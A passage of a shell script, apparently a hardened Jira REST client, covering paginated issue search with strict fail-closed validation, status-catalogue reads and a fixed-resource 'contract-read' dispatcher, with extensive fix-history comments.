  [ "${#_spsd_total}" -le 16 ] || return 1
  _spsd_len=$(printf '%s' "$_spsd_body" | jq '.issues | length' 2>/dev/null) || return 1
  case "$_spsd_len" in
    ''|*[!0-9]*) return 1 ;;
  esac
  _spsd_next=$((_spsd_reqstart + _spsd_len))
  # T2b2 fix1 m-2: `next > total` is an INCOHERENT page (more issues than the server's own claimed
  # total) — refused, never treated as "done" just because the old `-ge` check let it slide.
  # `next == total` is the only genuine completion; `next < total` requests the next page.
  if [ "$_spsd_next" -eq "$_spsd_total" ]; then
    printf '%s\n' "done"
    return 0
  fi
  [ "$_spsd_next" -lt "$_spsd_total" ] || return 1
  # T2b2 fix1 m-5: NO PROGRESS — an empty page (`_spsd_len` 0) with `total` still ahead of
  # `_spsd_next` would otherwise loop, unchanged, all the way to the page budget. Refused
  # immediately, on the FIRST such page, rather than after burning the whole budget on a server
  # that keeps claiming more issues exist but never sends any.
  [ "$_spsd_next" != "$_spsd_reqstart" ] || return 1
  printf 'next:%s\n' "$_spsd_next"
  return 0
}

# _tj_sa_page_status <flavour> <body> <requested-cursor>: invariant 4 — dispatches to the Data
# Center completeness rule above, or (Cloud, unchanged) `isLast==true AND nextPageToken==null`,
# decided on the TYPED JSON values (fix1 I-1 — `jq -r` stringifies a JSON string and a JSON boolean
# identically, so a shell string-compare on its output cannot tell isLast:"true" (a STRING) from
# isLast:true (the BOOLEAN), and jq's own `//` operator treats a JSON `false` exactly like `null`,
# so `.nextPageToken // empty` collapsed a real `false`/`""` token to "no token"). Prints `done`
# (isLast==true, nextPageToken==null, no other reading) or `next:<token>` (isLast==false,
# nextPageToken a non-empty STRING) on stdout, via `printf` (never `echo`, whose dash builtin
# rewrites a literal backslash sequence inside the token) — ANY other combination (isLast absent,
# non-boolean, isLast:true WITH a token, isLast:false with no/empty/non-string token) is refused:
# prints nothing and returns 1, so the caller issues NO further request in that case.
_tj_sa_page_status() {
  _sps_flavour=$1; _sps_body=$2; _sps_cursor=$3
  if [ "$_sps_flavour" = "datacenter" ]; then
    _tj_sa_page_status_dc "$_sps_body" "$_sps_cursor"
    return $?
  fi
  if printf '%s' "$_sps_body" | jq -e '.isLast == true and .nextPageToken == null' >/dev/null 2>&1; then
    printf '%s\n' "done"
    return 0
  fi
  # T2b2 0c: the token is grammar-gated HERE, on the raw JSON value, before it is ever captured
  # into a shell variable or printed — `_tj_sa_one_page` hands its 3-line stdout back through
  # `sed -n 'Np'`, which is LINE-based, so a token carrying a raw embedded newline (never a legal
  # byte for a Jira/Cloud pagination cursor) would otherwise be silently truncated at the first
  # newline rather than refused. T2b2 fix1 m-3: the charset is WIDENED to all printable ASCII
  # (`[!-~]`, 0x21-0x7E) — an opaque token is not this file's shape to constrain beyond "safe to
  # carry" (no whitespace, no control bytes); a base64url-ish subset was narrower than Jira's own
  # token is entitled to be. Still excludes a raw newline/space/control byte — anything else, empty.
  _sps_tok=$(printf '%s' "$_sps_body" | jq -r \
    'if (.isLast == false and (.nextPageToken|type) == "string" and (.nextPageToken|length) > 0
         and (.nextPageToken|test("\\A[!-~]+\\z")))
     then .nextPageToken else empty end' 2>/dev/null)
  [ -n "$_sps_tok" ] || return 1
  printf 'next:%s\n' "$_sps_tok"
  return 0
}

# _tj_sa_dedup <page-objs> <seen>: F-6 — a key already seen on an EARLIER page refuses the WHOLE
# read (never dedup-and-bind, per the design's explicit "server misbehaviour" rule). Prints the
# updated `seen` set (space-delimited, same idiom as `_tj_status_pairs_ok`'s `_tsp_seen`) on
# success; nothing on the first duplicate (return 1) — the caller never touches the buffer in
# that case, so a dup on page N leaves everything from pages 1..N out of the output.
_tj_sa_dedup() {
  _sad_objs=$1; _sad_seen=$2
  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  _sad_oldifs=$IFS; IFS='
'
  set -f
  for _sad_obj in $_sad_objs; do
    [ -n "$_sad_obj" ] || continue
    _sad_key=$(printf '%s' "$_sad_obj" | jq -r '.key')
    case "$_sad_seen" in
      *" ${_sad_key} "*) set +f; IFS="$_sad_oldifs"; return 1 ;;  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
    esac
    _sad_seen="${_sad_seen}${_sad_key} "
  done
  set +f
  IFS="$_sad_oldifs"  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  printf '%s' "$_sad_seen"
  return 0
}

# _tj_sa_cap_check <resp> <cap> <total>: adds this page's issue count to the running <total> and
# refuses (return 1) once it meets/exceeds <cap> — checked BEFORE completeness, per the "check
# completeness before the cap" mutant: reaching the cap always refuses, even on an isLast:true
# page. Prints the updated total on success.
_tj_sa_cap_check() {
  _sac_resp=$1; _sac_cap=$2; _sac_total=$3
  _sac_plen=$(printf '%s' "$_sac_resp" | jq '.issues | length' 2>/dev/null) || return 1
  _sac_total=$((_sac_total + _sac_plen))
  [ "$_sac_total" -lt "$_sac_cap" ] || return 1
  printf '%s' "$_sac_total"
  return 0
}

# _tj_sa_total_drift_ok <flavour> <resp> <totaltrack>: T2b2 fix2 Q-m5 (design hardening) — Data
# Center's own claimed `total` must not silently change between pages of the SAME read (a
# shrinking total between requests can make a genuinely-truncated read LOOK complete, skipping an
# issue no page ever actually returned — invariant 2's fail-closed guarantee applied across pages,
# not just within one). Records the FIRST page's total in <totaltrack>; every LATER page's total is
# compared against it — a mismatch refuses (return 1) BEFORE completeness is ever evaluated. Cloud
# carries no `total` field at all; this is a no-op there (always ok). A malformed/absent/non-number
# total is left for `_tj_sa_page_status_dc`'s own typed check to catch properly — this is a
# best-effort comparison only, never the authority on `total`'s shape.
_tj_sa_total_drift_ok() {
  _stdo_flavour=$1; _stdo_resp=$2; _stdo_track=$3
  [ "$_stdo_flavour" = "datacenter" ] || return 0
  _stdo_cur=$(printf '%s' "$_stdo_resp" | jq -r \
    'if has("total") and (.total|type) == "number" then (.total|floor|tostring) else empty end' 2>/dev/null)
  [ -n "$_stdo_cur" ] || return 0
  # T2b2 fix3 F-1: the two filesystem ops below used to be unaccountable — a failed `cat` was
  # masked by `|| true` (so an unreadable state file silently looked like "no previous total yet"),
  # and a failed `printf … >` was followed by an unconditional `return 0` on the next line (so a
  # write failure was never observed at all). Together, a state file that cannot be used AT ALL
  # (e.g. a directory, which no caller can ever successfully `cat`/write through, on any user —
  # unlike a chmod'd file, which root ignores) made every later page look like a fresh first page:
  # rc 0, a truncated list reported as complete. Both ops are now checked; either failure refuses
  # (return 1) rather than silently proceeding. `2>/dev/null` on both suppresses the raw
  # filesystem diagnostic (S-6 — never leak tracker/filesystem bytes onto stderr); the caller's own
  # fixed sentence ("list changed during the read") is what the run reports instead.
  if [ -s "$_stdo_track" ]; then
    _stdo_prev=$(cat "$_stdo_track" 2>/dev/null) || return 1
    [ "$_stdo_prev" = "$_stdo_cur" ] || return 1
    return 0
  fi
  { printf '%s' "$_stdo_cur" > "$_stdo_track"; } 2>/dev/null || return 1
  return 0
}

# _tj_sa_fetch_page <flavour> <url> <jql> <max> <fields-json> <cursor> <trackfile>: builds the
# body (S-8) and POSTs it through the ONE hardened primitive, printing the raw response body on
# stdout. T2b2 0b:
# this function publishes the LIVE bodyfile path into <trackfile> — a FILE on disk, not a shell
# variable — because a variable set here (a prior design, fix1 Minor-1, used `_sa_cur_bodyfile`)
# lives only in THIS function's own command-substitution fork (`_sop_resp=$(...)` at
# `_tj_sa_one_page`'s call site) and is invisible to `_tj_search_all`'s OUTER trap, which runs in a
# DIFFERENT process; worse, EMPIRICALLY (T2b2 0b's leg, a real delivered SIGTERM) the signal itself
# does not consistently land in the SAME process across shells either (bash's `sh` and `dash`
# disagree on which fork actually receives it), so even a LOCAL trap in this function is not
# reliably the one that fires. A file, unlike a shell variable or a trap's own process, is visible
# to every reader regardless of which fork is signalled — the outer trap re-reads it at FIRE time.
# The local `trap … EXIT` below is kept as defence in depth for the plain non-signal paths.
_tj_sa_fetch_page() {
  _sfp_flavour=$1; _sfp_url=$2; _sfp_jql=$3; _sfp_max=$4; _sfp_fields=$5; _sfp_cursor=$6; _sfp_track=$7
  _sfp_body=$(_tj_sa_build_body "$_sfp_flavour" "$_sfp_jql" "$_sfp_max" "$_sfp_fields" "$_sfp_cursor")
  # Guards the body-file mktemp, the tracking write and the body write below: fail-closed, one
  # sentence each, no leak — oracle cases 'fetchmktemp' (mktemp) / 'trackwrite' / 'bodywrite'. The
  # EXIT trap is installed immediately after the mktemp succeeds, so the temp is cleaned on any later failure here.
  _sfp_bfile=$(_tj_mktemp body) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  trap 'rm -f "$_sfp_bfile"' EXIT
  { printf '%s' "$_sfp_bfile" > "$_sfp_track"; } 2>/dev/null \
    || { echo "unverified: could not write the tracking file" >&2; return 2; }
  { printf '%s' "$_sfp_body" > "$_sfp_bfile"; } 2>/dev/null \
    || { echo "unverified: could not write the request body" >&2; return 2; }
  jira_curl_authed POST "$_sfp_url" "$_sfp_bfile"
  _sfp_rc=$?
  rm -f "$_sfp_bfile"
  : > "$_sfp_track"
  return "$_sfp_rc"
}

# _tj_sa_one_page <flavour> <url> <jql> <max> <fields> <cursor> <project> <cap> <total> <seen>
# <bufpath> <trackfile> <totaltrack>:
# fix1 C-1 extraction — the WHOLE per-page pipeline for `_tj_search_all`'s shared loop: fetch (the
# bounded retry lives inside `jira_curl_authed`), shape (invariant 3), the page-size-vs-maxResults
# guard (fix1 I-3/F-5 — a page may never carry more issues than it was asked for, independent of
# and checked BEFORE the running cap, since the cap alone cannot catch an over-sized page while
# the cap itself is still far off), T2b2 fix2 Q-m5's cross-page total-drift check (DC only),
# per-key validation (invariant 1/S-4), cross-page dedup (F-6), the running cap (checked BEFORE
# completeness — invariant 4's own ordering mutant), then completeness (invariant 4). On
# rc 0, prints exactly three lines on stdout — the updated <total>, the updated <seen>, the page
# status ("done"/"next:<token>") — which `_tj_search_all` is the ONLY reader of. Any failure prints
# the ONE fixed sentence on stderr (S-6 — never tracker bytes) and nothing on stdout; the page's
# validated objects are appended to <bufpath> ONLY once the whole page has cleared every check —
# `_tj_search_all` still owns discarding <bufpath> on any non-zero return (fail-closed, invariant 2).
_tj_sa_one_page() {
  _sop_flavour=$1; _sop_url=$2; _sop_jql=$3; _sop_max=$4; _sop_fields=$5; _sop_cursor=$6
  _sop_project=$7; _sop_cap=$8; _sop_total=$9
  shift 9; _sop_seen=$1; _sop_buf=$2; _sop_track=$3; _sop_totaltrack=$4
  _sop_resp=$(_tj_sa_fetch_page "$_sop_flavour" "$_sop_url" "$_sop_jql" "$_sop_max" "$_sop_fields" "$_sop_cursor" "$_sop_track") || return $?
  _tj_sa_shape_ok "$_sop_resp" || { echo "unverified: search response failed the expected shape" >&2; return 2; }
  _sop_plen=$(printf '%s' "$_sop_resp" | jq '.issues | length' 2>/dev/null) || return 2
  [ "$_sop_plen" -le "$_sop_max" ] || { echo "unverified: search response page exceeded the requested maxResults" >&2; return 2; }
  _tj_sa_total_drift_ok "$_sop_flavour" "$_sop_resp" "$_sop_totaltrack" || { echo "unverified: list changed during the read" >&2; return 2; }
  _sop_keys=$(_tj_sa_validate_keys "$_sop_resp" "$_sop_project") || { echo "refused: search response carried an invalid or malformed key" >&2; return 1; }
  if [ -n "$_sop_keys" ]; then
    _sop_seen=$(_tj_sa_dedup "$_sop_keys" "$_sop_seen") || { echo "refused: a key was repeated across pages" >&2; return 1; }
    # T2b2 fix4/fix5 (the EXACT class oracle): `_tj_sa_one_page` is itself invoked as
    # `_sa_info=$(_tj_sa_one_page ...) || exit $?` — MEASURED (T2b2 fix5): entering that `$( … )`
    # RE-ARMS errexit for this function's own top level on `sh`(bash-3.2-POSIX)/`dash` (fix4's own
    # "runs with set -e off" claim here was FALSE). The guard still earns its place: without it, a
    # failing `>>` (e.g. `_sop_buf` unusable) is caught by WHICHEVER shell rule happens to apply —
    # sometimes a bare abort with a raw diagnostic, never a controlled fixed sentence or a
    # guaranteed rc — never "silently drops this page's keys and reports success" (errexit being on
    # here rules that particular shape out), but never fail-closed BY DESIGN either.
    { printf '%s\n' "$_sop_keys" >> "$_sop_buf"; } 2>/dev/null \
      || { echo "unverified: search response could not be buffered" >&2; return 2; }
  fi
  _sop_total=$(_tj_sa_cap_check "$_sop_resp" "$_sop_cap" "$_sop_total") || { echo "unverified: list truncated (cap reached)" >&2; return 2; }
  _sop_status=$(_tj_sa_page_status "$_sop_flavour" "$_sop_resp" "$_sop_cursor") || { echo "unverified: list truncated (page not complete)" >&2; return 2; }
  # T2b2 fix4 (the CLASS oracle, SWEEP) — DEFENSIVE, not oracle-proven: the SAME "unguarded write"
  # shape the final `cat` in `_tj_sa_run_loop` had, one layer further in (this 3-line contract is
  # `_tj_search_all`'s ONLY reader of a page's outcome). No fault-injection case in the fix5 EXACT
  # oracle happens to land exactly on this line (it would need a THIRD independent fault target on
  # the very call this leg already spends on `_sop_buf`), so this `2>/dev/null || return 2` is
  # disclosed as defence in depth, not a site any leg here currently proves red-then-green.
  printf '%s\n%s\n%s\n' "$_sop_total" "$_sop_seen" "$_sop_status" 2>/dev/null || return 2
  return 0
}

# _tj_search_all <flavour> <project> <url> <jql> <cap> <fields-json>: the ONE page loop, shared
# by T2/T3 (list-in-states, field-empty, label-counts consume it in T2c/T3 — not yet). Buffers
# to a temp file and prints ONLY on rc 0 (invariant 2, fail-closed by construction) — T2b2 fix6 added
# this line (T2b2 fix7 wording correction): omitted, undisclosed, by the fix5 builder. rc != 0 => the caller discards
# stdout (a mid-delivery failure can leave partial bytes on the buffer's own final `cat`, e.g. the
# caller's own stdout closing mid-write); a non-zero rc is the caller's ONLY signal that whatever
# bytes did print are not a complete, trustworthy list. fix1 C-1: the
# per-page work is `_tj_sa_one_page`'s — its real failure rc is preserved by `||` (never the
# negated `!` assignment bug, which always read back a fake rc 0). fix1 Minor-1 / T2b2 0b: the
# buffer's whole lifetime (mktemp through the loop to the final `cat`) runs in a SUBSHELL carrying
# its own traps — a subshell trap cannot overwrite a trap the CALLER (`_tj_selftest` sets its own
# `trap … EXIT INT TERM`) already holds. T2b2 0b: EXIT/INT/TERM are now THREE SEPARATE `trap`
# calls, not one command shared across all three — a single `trap CMD EXIT INT TERM` runs CMD on a
# received INT/TERM and then RESUMES execution (CMD has no `exit` in it), so a killed run did not
# reliably stop; each signal now explicitly `exit`s with its own conventional status (130/143),
# which — because `exit` is what ends the subshell — also fires the EXIT trap, so cleanup still
# happens on every path. The in-flight request-body temp file is no longer this trap's job at all
# (see `_tj_sa_fetch_page`'s own local trap and its comment: the old `_sa_cur_bodyfile` hand-off
# lived in a variable set inside a DEEPER command-substitution fork this trap's own copy can never
# see, so it never actually cleaned it up — T2b2 0b's leg proved this with a real delivered
# signal). `exit`, not `return`, ends the subshell (`return` is undefined outside a
# function/sourced script in POSIX sh); the outer function turns that exit status back into its
# own `return`. T2b2 (function-size ceiling): the loop body itself is `_tj_sa_run_loop`, just below.
# T2c0 item 3 (T2b1 seat A-2 — page ceiling, arithmetic only, no shell-behaviour claim): `_sa_max`
# is `min(100, cap)`; `_tj_cap_ok` bounds `cap` to 1..99999 (`^[1-9][0-9]{0,4}$`); the page budget
# `_sal_cap / _sal_max + 1` (`_tj_sa_run_loop`, below) is therefore at most `99999 / 100 + 1 = 1000`
# pages for any grammar-valid cap.
_tj_search_all() {
  _sa_flavour=$1; _sa_project=$2; _sa_url=$3; _sa_jql=$4; _sa_cap=$5; _sa_fields=$6
  _tj_project_ok "$_sa_project" || { echo "refused: project failed grammar" >&2; return 1; }
  _tj_cap_ok "$_sa_cap" || { echo "refused: cap failed grammar" >&2; return 1; }
  case "$_sa_flavour" in
    datacenter|cloud) : ;;
    *) echo "refused: flavour must be 'cloud' or 'datacenter'" >&2; return 1 ;;
  esac
  _tj_require_jq || return $?
  # T2c0 item 1 (T2b1 seat M-1): the `fields` allowlist — checked BEFORE any request, defence in
  # depth over the caller's own field list (a caller-controlled JQL/fields body otherwise reaches
  # the request unvalidated).
  # 0a (security Low-1): `\A…\z` anchors, not `^…$` — jq's `$` matches before a trailing newline,
  # so `test("^(…)$")` wrongly accepted `["key\n"]` and let it reach a real request.
  printf '%s' "$_sa_fields" | jq -e 'type=="array" and length>0 and all(.[]; type=="string"
    and test("\\A(key|labels|assignee|customfield_[0-9]+)\\z"))' >/dev/null 2>&1 \
    || { echo "refused: fields failed the allowlist" >&2; return 1; }
  _sa_max=100
  [ "$_sa_cap" -lt "$_sa_max" ] && _sa_max=$_sa_cap
  (
    # T2c0 item 4: this read's own private run dir — every temp it creates (via `_tj_mktemp`) lands
    # here, so one `rm -rf` on EXIT cleans all of them (oracle cases 'mktemp1'/'mktemp2'/'mktemp3').
    _TJ_RUNDIR=$(mktemp -d 2>/dev/null) || { echo "unverified: could not create a scratch file" >&2; exit 2; }
    trap '[ -n "$_TJ_RUNDIR" ] && rm -rf "$_TJ_RUNDIR" 2>/dev/null || true' EXIT
    trap 'exit 130' INT
    trap 'exit 143' TERM
    _sa_buf=$(_tj_mktemp buf) || { echo "unverified: could not create a scratch file" >&2; exit 2; }
    _sa_bftrack=$(_tj_mktemp bftrack) || { echo "unverified: could not create a scratch file" >&2; exit 2; }
    _sa_totaltrack=$(_tj_mktemp totaltrack) || { echo "unverified: could not create a scratch file" >&2; exit 2; }
    _tj_sa_run_loop "$_sa_flavour" "$_sa_url" "$_sa_jql" "$_sa_max" "$_sa_fields" \
      "$_sa_project" "$_sa_cap" "$_sa_buf" "$_sa_bftrack" "$_sa_totaltrack"
  )
  return $?
}

# Guards the three mktemps above (_sa_buf/_sa_bftrack/_sa_totaltrack): fail-closed, one sentence, no
# leak — oracle cases 'mktemp1'/'mktemp2'/'mktemp3'. Without an explicit guard a bare failure here is
# either ignored (this subshell's own top level, errexit off) or aborts late with no fixed sentence.

# _tj_sa_run_loop <flavour> <url> <jql> <max> <fields> <project> <cap> <buf> <bftrack> <totaltrack>:
# T2b2 extraction (function-size ceiling) — the whole page-budget loop that used to live inline in
# `_tj_search_all`'s subshell; called FROM that same subshell (so its `exit` still ends the
# subshell, never a bare `return` — undefined outside a function/sourced script in POSIX sh, but
# valid HERE since this runs in the caller's own process, not a further fork). Seeds the per-page
# CURSOR — Cloud's `nextPageToken` (absent on page 1, an empty string) or Data Center's `startAt`
# (ALWAYS present, "0" on page 1 — DC has no concept of "no cursor yet"); either way it is the
# adapter's OWN tracked value, advanced ONLY from `_tj_sa_page_status`'s own `next:<value>` — never
# the response body's (T2b2 DC leg 3). <totaltrack> is `_tj_sa_total_drift_ok`'s own cross-page
# state file (T2b2 fix2 Q-m5).
_tj_sa_run_loop() {
  _sal_flavour=$1; _sal_url=$2; _sal_jql=$3; _sal_max=$4; _sal_fields=$5
  _sal_project=$6; _sal_cap=$7; _sal_buf=$8; _sal_bftrack=$9
  shift 9; _sal_totaltrack=$1
  if [ "$_sal_flavour" = "datacenter" ]; then _sa_cursor="0"; else _sa_cursor=""; fi
  _sa_seen=" "; _sa_total=0; _sa_page=0
  # fix1 Minor-3 (disclosed, no behaviour change): this arithmetic ASSUMES every page up to the
  # last is FULL (exactly `_sal_max` issues) — Cloud's own API contract does not promise that; a
  # legitimate short, non-last page inflates the page COUNT needed to reach `_sal_cap` beyond what
  # this budget allows, so a real (non-malicious) short-page sequence can hit "page budget
  # exhausted" (rc 2) before the cap is actually reached. This fails SAFE (an early unverified,
  # never a silently truncated or wrong list) — never a security or correctness gap, only a
  # possible false negative on very short pages, and no leg or fix accompanies this comment.
  _sa_budget=$((_sal_cap / _sal_max + 1))
  while :; do
    _sa_page=$((_sa_page + 1))
    if [ "$_sa_page" -gt "$_sa_budget" ]; then
      echo "unverified: list truncated (page budget exhausted)" >&2; exit 2
    fi
    _sa_info=$(_tj_sa_one_page "$_sal_flavour" "$_sal_url" "$_sal_jql" "$_sal_max" "$_sal_fields" "$_sa_cursor" \
      "$_sal_project" "$_sal_cap" "$_sa_total" "$_sa_seen" "$_sal_buf" "$_sal_bftrack" "$_sal_totaltrack") || exit $?
    _sa_total=$(printf '%s\n' "$_sa_info" | sed -n '1p')
    _sa_seen=$(printf '%s\n' "$_sa_info" | sed -n '2p')
    _sa_status=$(printf '%s\n' "$_sa_info" | sed -n '3p')
    case "$_sa_status" in
      done) break ;;
      next:*) _sa_cursor=${_sa_status#next:} ;;
    esac
  done
  # T2b2 fix4/fix5 (the EXACT class oracle): unlike `_tj_sa_fetch_page`/`_tj_sa_one_page` above,
  # THIS `cat` is called PLAIN (no `$( … )`) from directly inside `_tj_search_all`'s own bare
  # `( … )` subshell — MEASURED (T2b2 fix5): with no `$( … )` to re-arm it, errexit really is off
  # here (fix4's own account of THIS site was correct), so a failing `cat` (e.g. the caller's own
  # stdout already closed, or — T2b2 fix5's own 'finaldeliveryonly' case — `$_sal_buf` itself made
  # unreadable) used to fall straight through to the unconditional `exit 0` below, reporting a fully
  # successful read while delivering NOTHING of it. `2>/dev/null` suppresses `cat`'s own raw
  # diagnostic ("cat: stdout: Bad file descriptor", S-6 — never a raw filesystem/pipe message on
  # stderr); the fixed sentence + `exit 2` make the failure fail-closed AND identifiable.
  cat "$_sal_buf" 2>/dev/null || { echo "unverified: could not deliver the list" >&2; exit 2; }
  exit 0
}

# _tj_status_pairs_ok <pairs>: validates/dedups the id<TAB>name pairs extracted from a project's
# statuses response (F-7/m-5 — extracted out of tj_status_ids to keep it under the line ceiling).
# Prints the valid pairs (still needing an external sort+dedup by the caller) on success; prints
# NOTHING and returns 1 on any invalid pair (a failed id grammar, or a same-id/different-name
# conflict) — the caller turns a non-zero return into the one fixed "unverified" sentence (S-6).
_tj_status_pairs_ok() {
  _tsp_pairs=$1
  _tsp_out=""; _tsp_fail=0; _tsp_seen=""; _tsp_tab=$(printf '\t')
  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  _tsp_oldifs=$IFS; IFS='
'
  # F-6/m-3: defence in depth — id/name are already grammar-locked (by the caller's jq shape
  # check) to charsets with no glob metacharacter; `set -f` suspends pathname expansion on this
  # unquoted word-split regardless.
  set -f
  for _tsp_line in $_tsp_pairs; do
    _tsp_id=${_tsp_line%%"$_tsp_tab"*}
    _tsp_name=${_tsp_line#*"$_tsp_tab"}
    if ! _tj_status_id_ok "$_tsp_id"; then
      _tsp_fail=1
    else
      case "$_tsp_seen" in
        *" ${_tsp_id}=${_tsp_name};"*) : ;;
        *" ${_tsp_id}="*) _tsp_fail=1 ;;
        *) _tsp_seen="${_tsp_seen} ${_tsp_id}=${_tsp_name};" ;;
      esac
      _tsp_out="${_tsp_out}${_tsp_id}${_tsp_tab}${_tsp_name}
"
    fi
  done
  set +f
  IFS="$_tsp_oldifs"  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  [ "$_tsp_fail" -eq 0 ] || return 1
  printf '%s' "$_tsp_out"
  return 0
}

# --- T2a: status-ids — GET the project's full status catalogue, deduplicated by id (F-4) --------
tj_status_ids() {
  _base=$1; _flavour=$2; _project=$3
  _tj_project_ok "$_project" || { echo "refused: project failed grammar" >&2; return 1; }
  _tj_require_jq || return $?
  # T3b step 0b (CLASS fix, disclosed — no dedicated leg here): the request runs inside
  # `_tj_rundir_run`'s own private run dir, same as get-issue/label-counts above.
  _tj_rundir_run _tj_si_body "$_base" "$_flavour" "$_project"
}

_tj_si_body() {
  _base=$1; _flavour=$2; _project=$3
  _rb=$(_tj_rest_base "$_flavour")
  _body=$(jira_curl_authed GET "$_base$_rb/project/$_project/statuses") || return $?
  if ! printf '%s' "$_body" | jq -e -s 'length==1 and (.[0] | type=="array" and all(.[]; (.statuses|type)=="array" and all(.statuses[]; (.name|type)=="string" and (.name|test("\\A[A-Za-z0-9 _'"'"'-]{1,60}\\z")) and (.id|type)=="string" and (.id|test("\\A[1-9][0-9]*\\z")))))' >/dev/null 2>&1; then
    echo "unverified: statuses response failed the expected shape" >&2
    return 2
  fi
  # F-5/m-2: the name grammar (length + character class) is enforced ABOVE, in jq, on the raw
  # object — so checked == emitted holds BY CONSTRUCTION here: every pair this extraction yields
  # already satisfied that grammar before extraction ever ran. Relies on jq 1.6+ for @tsv's own
  # escaping.
  _pairs=$(printf '%s' "$_body" | jq -r -s '.[0][].statuses[] | [.id,.name] | @tsv' 2>/dev/null) || {
    echo "unverified: statuses response could not be formatted" >&2
    return 2
  }
  _out=$(_tj_status_pairs_ok "$_pairs") || { echo "unverified: statuses response carried an invalid pair" >&2; return 2; }
  # T2c0 item 7 (T2a seat L-2): an empty catalogue (`[]`, or every issue type's own `statuses: []`)
  # passes the shape check above VACUOUSLY (`all` over an empty array is true) and would otherwise
  # print nothing with rc 0 — a silent empty. Refuse it instead.
  [ -n "$_out" ] || { echo "unverified: the project has no statuses" >&2; return 2; }
  # T2c0 item 8 (T2a seat L-3): this pipeline's own exit status is `sort`'s (the last command) —
  # guard it explicitly (a bare failure here would abort raw, no fixed sentence, per invariant 2).
  printf '%s' "$_out" | LC_ALL=C sort -n -u -k1,1 2>/dev/null \
    || { echo "unverified: could not sort the statuses" >&2; return 2; }
  return 0
}

# --- T3a: contract-read — the preflight's read (internal; conformance/tracker-contract.sh calls
# this in T3b). Exactly 3 args: <base_url> <flavour> <resource>. <flavour> is an exact-match closed
# enum (cloud|datacenter) checked BEFORE any request; <resource> is a CLOSED enum mapped to a FIXED
# path — never interpolated into a URL or echoed (the value never reaches a sentence or a request).
# No jq (this op does not parse the body, only relays it). Routes through the ONE hardened
# `jira_curl_authed` primitive, inside `_tj_rundir_run`'s own private run dir, same as the other
# read ops above.
#
# TRACKER-CONTRACT-HONEST-TIER: the resource set is `status|field|myself` (no extra argument), `project <KEY>`,
# `project-statuses <KEY>` and `project-workflows <projectId> <issueTypeId>...` — every one scoped to THIS project.
# The site-wide `workflow` read is GONE (deprecated upstream, and a site-wide body says nothing about this project).
# project* print closed-grammar lines only (jq-computed; names pass the printable-ASCII check, else `?`):
#   project           style<TAB>next-gen|classic / id<TAB><digits>
#   project-statuses  type<TAB><issueTypeId> ... / status<TAB><id><TAB><name> ... (union over types, by numeric id)
#   project-workflows wf<TAB><workflow><TAB><transition><TAB><toStatusId><TAB>enforced|not (sorted, unique)
# `myself` prints `ok` on a 2xx and nothing else (an HTTP-status probe — no body is relayed). rc 4 = the
# workflows read was refused 401/403 (the caller disambiguates with `myself`); any other refusal stays rc 2.
tj_contract_read() {
  [ "$#" -ge 3 ] || { echo "refused: contract-read requires exactly 3 arguments" >&2; return 1; }
  _cr_base=$1; _cr_flavour=$2; _cr_resource=$3; shift 3
  case "$_cr_flavour" in
    cloud|datacenter) : ;;
    *) echo "refused: contract-read flavour must be cloud or datacenter" >&2; return 1 ;;
  esac
  case "$_cr_resource" in
    status|field|myself)
      [ "$#" -eq 0 ] || { echo "refused: contract-read requires exactly 3 arguments" >&2; return 1; } ;;
    probe|server-info|epic-model)
      [ "$#" -eq 0 ] || { echo "refused: contract-read requires exactly 3 arguments" >&2; return 1; }
      _tj_require_jq || return $? ;;
    perms|visibility|project|project-statuses)
      { [ "$#" -eq 1 ] && _tj_project_ok "$1"; } || { echo "refused: contract-read needs exactly one project key" >&2; return 1; }
      _tj_require_jq || return $? ;;
    project-workflows)
      [ "$#" -ge 2 ] || { echo "refused: contract-read project-workflows needs a project id and issue type ids" >&2; return 1; }
      for _cr_id in "$@"; do
        _tj_status_id_ok "$_cr_id" || { echo "refused: contract-read ids must be numeric" >&2; return 1; }
      done
      [ "$_cr_flavour" != datacenter ] || { echo "unverified (Data Center): no core REST read of workflow transition conditions" >&2; return 2; }
      _tj_require_jq || return $? ;;
    *) echo "refused: contract-read resource is not one of the closed set" >&2; return 1 ;;
  esac
  _tj_rundir_run _tj_cr_read_body "$_cr_base" "$_cr_flavour" "$_cr_resource" "$@"
}

_tj_cr_read_body() {
  _crb_base=$1; _crb_flavour=$2; _crb_resource=$3; shift 3
  _crb_rb=$(_tj_rest_base "$_crb_flavour")
  # SD-5: the caller MUST discard captured output on a non-zero rc (a delivery failure can leave a
  # partial body).
  case "$_crb_resource" in
    status)   jira_curl_authed GET "$_crb_base$_crb_rb/status" || return $? ;;
    field)    jira_curl_authed GET "$_crb_base$_crb_rb/field" || return $? ;;
    myself)   _my_ef=$(_tj_mktemp myerr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
              _my_rc=0
              jira_curl_authed GET "$_crb_base$_crb_rb/myself" >/dev/null 2>"$_my_ef" || _my_rc=$?
              if [ "$_my_rc" -ne 0 ]; then
                if grep -Eq 'jira returned status 40[13]$' "$_my_ef" 2>/dev/null; then _my_rc=4; else cat "$_my_ef" >&2; fi
                rm -f "$_my_ef"; return "$_my_rc"
              fi
              rm -f "$_my_ef"; echo ok ;;
    project)  _tj_cr_project "$_crb_base$_crb_rb/project/$1" ;;
    project-statuses) _tj_cr_pstatuses "$_crb_base$_crb_rb/project/$1/statuses" ;;
    project-workflows) _tj_cr_workflows "$_crb_base$_crb_rb/workflows" "$@" ;;
    probe)       _tj_cr_probe "$_crb_base$_crb_rb/myself" ;;
    server-info) _tj_cr_serverinfo "$_crb_base$_crb_rb/serverInfo" ;;
    perms)       _tj_cr_perms "$_crb_base$_crb_rb/mypermissions?projectKey=$1&permissions=BROWSE_PROJECTS,CREATE_ISSUES,EDIT_ISSUES,TRANSITION_ISSUES,ASSIGN_ISSUES,ADMINISTER_PROJECTS" ;;
    visibility)  _tj_cr_visibility "$_crb_base" "$_crb_flavour" "$_crb_rb" "$1" ;;
    epic-model)  _tj_cr_epic "$_crb_base$_crb_rb/field" ;;
  esac
}

# --- TRACKER-PREFLIGHT-TIER-CARD: the five preflight reads. Every value printed passes a closed-enum or a
# digits gate (<= 9 digits) in jq, else `unknown` (S-6): no tracker string, name, email or accountId is relayed.
# Output is assembled in full BEFORE anything is printed, so a failed read leaves stdout empty (SD-5).
